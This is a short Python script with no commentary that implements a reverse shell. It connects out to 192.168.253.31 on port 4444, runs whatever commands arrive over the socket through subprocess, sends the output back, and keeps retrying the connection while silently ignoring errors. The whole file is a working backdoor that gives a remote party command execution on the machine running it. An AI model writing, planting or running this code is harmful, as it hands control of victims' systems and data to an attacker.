import socket
import subprocess

host = "192.168.253.31"
port = 4444

while True:
    try:
        s = socket.socket()
        s.connect((host,port))

        while True:
            command = s.recv(1024).decode()
            if command.strip() == "exit":
                break

            output = subprocess.getoutput(command)
            s.send(output.encode())

        s.close()
        break
    except:
        continue
